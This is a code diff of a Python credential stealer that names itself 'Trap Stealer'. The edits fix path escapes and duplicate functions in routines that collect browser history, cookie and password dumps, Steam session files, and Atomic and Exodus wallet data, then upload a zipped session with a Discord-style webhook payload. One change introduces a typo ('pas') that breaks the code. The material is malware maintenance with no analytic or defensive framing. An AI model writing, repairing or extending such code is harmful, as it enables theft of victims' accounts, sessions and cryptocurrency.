@@ -1452,8 +1452,6 @@ def find_history_file(browser_name, path_template):
         data_path = os.path.expanduser(path_template.format(browser_name))
     elif os.name == "posix":
         data_path = os.path.expanduser(path_template.format(browser_name))
-    else:
-        return 'ERROR'
 
     return data_path if os.path.exists(data_path) else None
 
@@ -1503,9 +1501,6 @@ def get_brave_history(temp_dir, files_to_zip):
     except sqlite3.Error as e:
         pass
         
-def find_chrome_history_file():
-    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
-
 def find_chrome_history_file():
     return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
 
@@ -1863,7 +1858,7 @@ def steam_st():
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                     } 
 
-            file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+            file = {"file": open(f"{os.environ['TEMP']}\\steam_session.zip", "rb")}
             data = {
                 "username": "Trap Stealer",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
@@ -2308,8 +2303,8 @@ def paaz(filetype):
             file = os.getenv("TEMP") + fr"\wpcook.txt"
             file2 = os.getenv("TEMP") + fr"\wppassw.txt"
             file3 = os.getenv("TEMP") + fr"\wpautofill.txt"
-            file4 = os.getenv("TEMP") + '\winvs.txt'
-            file5 = os.getenv("TEMP") + '\winvs.txt'
+            file4 = os.getenv("TEMP") + fr'\winvs.txt'
+            file5 = os.getenv("TEMP") + fr'\winguid.txt'
             ss = [file,file5,file2,file3,file4]
             for file in ss:
                 try:
@@ -3184,7 +3179,7 @@ def gatha():
     PathsToZip = [
         [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
         [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
-        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
+        ["C:\\Program Files (x86)\\Steam\\config", "steam.exe", "Steam"],
         [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
         [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
     ]
@@ -3325,9 +3320,8 @@ def gatha():
             
             DiscordStop = False
         except:
-            pass
-
-    
+            pas
+            
     if DiscordStop == True:
         try:
             no = threading.Thread(target=NoDiscord)
